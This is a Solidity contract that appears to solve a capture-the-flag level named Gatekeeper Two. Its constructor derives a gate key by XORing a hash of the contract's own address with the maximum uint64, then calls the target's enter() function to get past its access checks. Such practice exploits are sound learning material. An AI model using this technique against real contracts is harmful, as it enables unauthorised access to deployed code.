// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0; // used this to uncheck underflow

interface GaterKeeperTwo {
    function enter(bytes8 _gateKey) external;
}

contract GateKeeperTwoHack {
    constructor(address _gateKeeperTwoAddress) public payable {
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
            (uint64(0) - 1);
        // has to use this way instead of low-level address.call() i don't know why??
        GaterKeeperTwo(_gateKeeperTwoAddress).enter(bytes8(key));
    }
}
